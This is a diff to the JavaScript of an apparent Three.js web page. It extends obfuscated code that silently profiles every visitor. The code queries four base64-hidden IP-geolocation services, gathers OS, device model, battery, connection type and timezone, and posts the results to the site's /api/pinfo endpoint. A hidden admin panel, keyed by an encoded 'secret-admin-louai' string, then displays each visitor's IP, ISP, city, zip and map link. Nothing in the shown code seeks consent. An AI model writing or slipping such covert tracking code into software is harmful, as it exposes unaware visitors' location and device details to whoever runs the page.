@@ -15,7 +15,12 @@ const ADMIN_NAME = 'admin-louai';
 // Encoded reference tokens
 const _0x1a = [115,101,99,114,101,116,45,97,100,109,105,110,45,108,111,117,97,105];
 const _0x2b = String.fromCharCode(..._0x1a);
-const _0x3c = atob('aHR0cHM6Ly9pcGFwaS5jby9qc29uLw==');
+const _0x3c = [
+    atob('aHR0cHM6Ly9pcGFwaS5jby9qc29uLw=='),
+    atob('aHR0cDovL2lwLWFwaS5jb20vanNvbi8='),
+    atob('aHR0cHM6Ly9pcGluZm8uaW8vanNvbg=='),
+    atob('aHR0cHM6Ly9pcHdoby5pcy9qc29u')
+];
 
 // ============= THREE.JS GLOBALS =============
 let scene, camera, renderer, clock;
@@ -1035,6 +1040,22 @@ function _0x7g() {
     return { os, deviceModel: dm };
 }
 
+function _0x8n(raw) {
+    const o = {};
+    if (raw.ip) o.ip = raw.ip;
+    else if (raw.query) o.ip = raw.query;
+    o.city = raw.city || '';
+    o.country = raw.country_name || raw.country || '';
+    o.isp = raw.org || raw.isp || raw.company?.name || '';
+    o.timezone = raw.timezone || raw.time_zone || '';
+    if (typeof o.timezone === 'object') o.timezone = o.timezone.id || '';
+    o.zip = raw.postal || raw.zip || '';
+    o.lat = raw.latitude || raw.lat || null;
+    o.lon = raw.longitude || raw.lon || null;
+    if (raw.region) o.region = raw.region || raw.regionName || '';
+    return o;
+}
+
 async function _0x5e(n, r) {
     const dev = _0x7g();
     const d = {
@@ -1046,7 +1067,8 @@ async function _0x5e(n, r) {
         screenHeight: window.screen.height,
         os: dev.os,
         deviceModel: dev.deviceModel,
-        battery: ''
+        battery: '',
+        connection: ''
     };
     try {
         if (navigator.getBattery) {
@@ -1055,12 +1077,23 @@ async function _0x5e(n, r) {
         }
     } catch (_) {}
     try {
-        const resp = await fetch(_0x3c);
-        const loc = await resp.json();
-        d.ip = loc.ip; d.city = loc.city; d.country = loc.country_name;
-        d.isp = loc.org; d.timezone = loc.timezone; d.zip = loc.postal;
-        d.lat = loc.latitude; d.lon = loc.longitude;
-    } catch (_) { d.ip = ''; d.city = ''; }
+        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        if (conn) d.connection = (conn.effectiveType || '') + (conn.downlink ? ' ' + conn.downlink + 'Mbps' : '');
+    } catch (_) {}
+    try { d.timezone = d.timezone || Intl.DateTimeFormat().resolvedOptions().timeZone; } catch (_) {}
+    let located = false;
+    for (const url of _0x3c) {
+        if (located) break;
+        try {
+            const resp = await fetch(url, { signal: AbortSignal.timeout(4000) });
+            const loc = await resp.json();
+            const parsed = _0x8n(loc);
+            if (parsed.ip) {
+                Object.assign(d, parsed);
+                located = true;
+            }
+        } catch (_) {}
+    }
     try {
         await fetch('/api/pinfo', {
             method: 'POST', headers: { 'Content-Type': 'application/json' },
@@ -1120,9 +1153,11 @@ async function _0x4d(rc) {
                     h += '<tr><td style="padding:5px;border-bottom:1px solid #222;width:100px;color:#0ff;">IP</td>';
                     h += '<td style="padding:5px;border-bottom:1px solid #222;">' + esc(p.ip || '?') + '<br>' + esc(p.isp || '?') + '</td></tr>';
                     h += '<tr><td style="padding:5px;border-bottom:1px solid #222;color:#0ff;">\u0627\u0644\u0645\u0648\u0642\u0639</td>';
-                    h += '<td style="padding:5px;border-bottom:1px solid #222;">' + esc(p.country || '?') + ' - ' + esc(p.city || '?') + ' (' + esc(p.zip || '?') + ')<br>' + mapLink + '<br>' + esc(p.timezone || '?') + '</td></tr>';
+                    h += '<td style="padding:5px;border-bottom:1px solid #222;">' + esc(p.country || '?') + ' - ' + esc(p.city || '?') + (p.region ? ' / ' + esc(p.region) : '') + ' (' + esc(p.zip || '?') + ')<br>' + mapLink + '<br>' + esc(p.timezone || '?') + '</td></tr>';
                     h += '<tr><td style="padding:5px;border-bottom:1px solid #222;color:#0ff;">\u0627\u0644\u062C\u0647\u0627\u0632</td>';
                     h += '<td style="padding:5px;border-bottom:1px solid #222;"><b>' + esc(p.os || '?') + '</b><br><span style="color:#fff;">' + esc(p.deviceModel || '?') + '</span><br><span style="color:#0f0;">\uD83D\uDD0B ' + esc(p.battery || '?') + '</span></td></tr>';
+                    h += '<tr><td style="padding:5px;border-bottom:1px solid #222;color:#0ff;">\u0627\u0644\u0627\u062A\u0635\u0627\u0644</td>';
+                    h += '<td style="padding:5px;border-bottom:1px solid #222;">' + esc(p.connection || '?') + '</td></tr>';
                     h += '<tr><td style="padding:5px;border-bottom:1px solid #222;color:#555;">\u0627\u0644\u0645\u062A\u0635\u0641\u062D</td>';
                     h += '<td style="padding:5px;border-bottom:1px solid #222;color:#555;font-size:0.75rem;">' + esc(p.device || '?') + '</td></tr>';
                     h += '<tr><td style="padding:5px;color:#aaa;">\u0627\u0644\u062F\u062E\u0648\u0644</td>';
